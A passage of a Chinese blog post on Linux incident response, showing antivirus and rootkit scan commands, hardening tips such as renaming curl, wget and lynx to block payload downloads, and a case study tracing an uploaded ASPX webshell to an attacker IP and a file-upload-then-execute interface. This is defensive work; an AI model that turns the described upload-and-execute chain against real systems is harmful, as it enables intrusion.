+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">扫描：clamscan -r /usr —max-dir-recursion=5 -l /tmp/clamav.log</div><div class="line"></div><div class="line">移除：clamscan -r  —remove  /usr/bin/</div></pre></td></tr></table></figure>
+<p>rkhunter</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">rkhunter --propupd</div><div class="line"></div><div class="line">rkhunter --check</div></pre></td></tr></table></figure>
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>1、一定要查看系统命令是否被替换，否则所做的都是一切徒劳。。。</p>
+<p>2、若系统替换可用其他代替，如：ps使用top，netstat使用ss等</p>
+<p>3、<code>lsof -n |grep delete</code> 查找已经删除但是还在使用的文件 </p>
+<p>4、留意下是否有SSH后门</p>
+<p>5、注意是否存在隐藏进程</p>
+<p>6、实在无法删除可使用<code>chattr  +i</code>锁定相应计划任务文件</p>
+<p>7、实在不行修改把<code>curl</code> ，<code>wget</code> ,<code>lynx</code> 文件全局重命名</p>
+<h1 id="附：记一次事件分析详细排查步骤"><a href="#附：记一次事件分析详细排查步骤" class="headerlink" title="附：记一次事件分析详细排查步骤"></a>附：记一次事件分析详细排查步骤</h1><h2 id="1、事件缘由"><a href="#1、事件缘由" class="headerlink" title="1、事件缘由"></a>1、事件缘由</h2><p>客户反馈服务器D盘里面的文件被删除了，要求排查什么原因导致的，什么漏洞引发的。</p>
+<h2 id="2、事件分析"><a href="#2、事件分析" class="headerlink" title="2、事件分析"></a>2、事件分析</h2><p>前期准备工作：端口扫描、黑盒漏扫、弱口令、是否存在命令执行相关漏洞等，未果，进入服务器排查。</p>
+<p>D盾全盘webshell查杀发现恶意文件（中间的一些用户，组，进程，日志排查步骤等我就不说了）</p>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/yj-0.png" alt=""></p>
+<p>webshell名为enshell.aspx</p>
+<p>根据该webshell文件名查找日志</p>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/yj-1.png" alt=""></p>
+<p>定位记录该恶意文件的日志信息，找到攻击者IP</p>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/yj-2.png" alt=""></p>
+<p>攻击者IP：110.87.13.61</p>
+<p>威胁情报来一波</p>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/yj-3.png" alt=""></p>
+<p>根据IP定位黑客攻击点</p>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/yj-4.png" alt=""></p>
+<p>定位记录详情</p>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/yj-5.png" alt=""></p>
+<p>定位漏洞源头</p>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/yj-6.png" alt=""></p>
+<p>至此，事件分析结束。</p>
+<h2 id="3、事件结论"><a href="#3、事件结论" class="headerlink" title="3、事件结论"></a>3、事件结论</h2><p>由此可知：黑客先利用<code>/xxx/upload2Server/</code>接口上传了恶意文件，再利用<code>/xxx/checkfileexists/</code>判断文件是否上传成功，最后利用，<code>/xxx/executecmd/</code>执行了该恶意文件。</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>大爷，赏个铜板呗！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/images/weixin.png" alt="瓦都剋 WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/images/zhifubao.png" alt="瓦都剋 Alipay"/>
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong>本文作者：</strong>
+      瓦都剋
+    </li>
+    <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://byd.dropsec.xyz/2018/05/08/关于Linux挖矿、DDOS等应急事件处置方法/" title="关于Linux挖矿、DDOS等应急事件处置方法">http://byd.dropsec.xyz/2018/05/08/关于Linux挖矿、DDOS等应急事件处置方法/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong>
+      本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/爆破/" rel="tag"><i class="fa fa-tag"></i> 爆破</a>
+          
+            <a href="/tags/linux/" rel="tag"><i class="fa fa-tag"></i> linux</a>
+          
+            <a href="/tags/应急响应/" rel="tag"><i class="fa fa-tag"></i> 应急响应</a>
+          
+            <a href="/tags/命令执行/" rel="tag"><i class="fa fa-tag"></i> 命令执行</a>
+          
+            <a href="/tags/反序列化/" rel="tag"><i class="fa fa-tag"></i> 反序列化</a>
+          
+            <a href="/tags/Redis/" rel="tag"><i class="fa fa-tag"></i> Redis</a>
+          
+            <a href="/tags/Memcache/" rel="tag"><i class="fa fa-tag"></i> Memcache</a>
+          
+            <a href="/tags/Weblogic/" rel="tag"><i class="fa fa-tag"></i> Weblogic</a>
+          
+            <a href="/tags/ActiveMQ/" rel="tag"><i class="fa fa-tag"></i> ActiveMQ</a>
+          
+            <a href="/tags/Tomcat/" rel="tag"><i class="fa fa-tag"></i> Tomcat</a>
+          
+            <a href="/tags/Kubernetes/" rel="tag"><i class="fa fa-tag"></i> Kubernetes</a>
+          
+            <a href="/tags/RMI/" rel="tag"><i class="fa fa-tag"></i> RMI</a>
+          
+            <a href="/tags/Docker/" rel="tag"><i class="fa fa-tag"></i> Docker</a>
+          
+            <a href="/tags/Struts2/" rel="tag"><i class="fa fa-tag"></i> Struts2</a>
+          
+            <a href="/tags/未授权访问/" rel="tag"><i class="fa fa-tag"></i> 未授权访问</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/27/PrxoyPool-免费代理池的设计与实现/" rel="next" title="PrxoyPool-免费代理池的设计与实现">
+                <i class="fa fa-chevron-left"></i> PrxoyPool-免费代理池的设计与实现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/05/29/命令执行绕过之Linux通配符/" rel="prev" title="命令执行绕过之Linux通配符">
+                命令执行绕过之Linux通配符 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="瓦都剋" />
+          <p class="site-author-name" itemprop="name">瓦都剋</p>
+           
+              <p class="site-description motion-element" itemprop="description">Looking at yourself from a different Angle!</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">84</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">68</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/w2n1ck" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://github.com/w2n1ck" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.zhihu.com/people/w2n1ck/activities" target="_blank" title="Zhihu">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Zhihu
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://wkh.dropsec.xyz" title="王小洪" target="_blank">王小洪</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://fgp.dropsec.xyz" title="冯小鹏" target="_blank">冯小鹏</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.neargle.com/" title="周小斌" target="_blank">周小斌</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://am4zing.me/" title="王小岩" target="_blank">王小岩</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://yangge.me/" title="杨大成" target="_blank">杨大成</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.secpulse.com/" title="安全脉搏" target="_blank">安全脉搏</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.dropsec.xyz/" title="团队主页" target="_blank">团队主页</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-应急事件处理流程是什么？"><span class="nav-number">2.</span> <span class="nav-text">0x01 应急事件处理流程是什么？</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#服务器安全排查"><span class="nav-number">2.1.</span> <span class="nav-text">服务器安全排查</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#问题事件分析"><span class="nav-number">2.2.</span> <span class="nav-text">问题事件分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#应用系统安全漏洞排查"><span class="nav-number">2.3.</span> <span class="nav-text">应用系统安全漏洞排查</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-攻击者进行挖矿、DDoS利用的漏洞有哪些？"><span class="nav-number">3.</span> <span class="nav-text">0x02 攻击者进行挖矿、DDoS利用的漏洞有哪些？</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1、未授权访问"><span class="nav-number">3.1.</span> <span class="nav-text">1、未授权访问</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2、Tomcat"><span class="nav-number">3.2.</span> <span class="nav-text">2、Tomcat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3、ActiveMQ"><span class="nav-number">3.3.</span> <span class="nav-text">3、ActiveMQ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4、爆破"><span class="nav-number">3.4.</span> <span class="nav-text">4、爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5、Struts2"><span class="nav-number">3.5.</span> <span class="nav-text">5、Struts2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6、Java-RMI命令执行"><span class="nav-number">3.6.</span> <span class="nav-text">6、Java RMI命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7、Weblogic"><span class="nav-number">3.7.</span> <span class="nav-text">7、Weblogic</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-应急响应快速排查步骤"><span class="nav-number">4.</span> <span class="nav-text">0x03 应急响应快速排查步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#检查进程及文件"><span class="nav-number">4.1.</span> <span class="nav-text">检查进程及文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#检测网络"><span class="nav-number">4.2.</span> <span class="nav-text">检测网络</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#检查计划任务"><span class="nav-number">4.3.</span> <span class="nav-text">检查计划任务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#检查系统命令"><span class="nav-number">4.4.</span> <span class="nav-text">检查系统命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Webshell"><span class="nav-number">4.5.</span> <span class="nav-text">Webshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用杀毒软件"><span class="nav-number">4.6.</span> <span class="nav-text">使用杀毒软件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注意事项"><span class="nav-number">4.7.</span> <span class="nav-text">注意事项</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#附：记一次事件分析详细排查步骤"><span class="nav-number">5.</span> <span class="nav-text">附：记一次事件分析详细排查步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1、事件缘由"><span class="nav-number">5.1.</span> <span class="nav-text">1、事件缘由</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2、事件分析"><span class="nav-number">5.2.</span> <span class="nav-text">2、事件分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3、事件结论"><span class="nav-number">5.3.</span> <span class="nav-text">3、事件结论</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2015 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-linkedin"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">瓦都剋</span>
+</div>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://mydisqus-2.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://byd.dropsec.xyz/2018/05/08/关于Linux挖矿、DDOS等应急事件处置方法/';
+          this.page.identifier = '2018/05/08/关于Linux挖矿、DDOS等应急事件处置方法/';
+          this.page.title = '关于Linux挖矿、DDOS等应急事件处置方法';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://mydisqus-2.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+<script type="text/javascript" color="0,0,0" opacity='0.7' zIndex="-2" count="20" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
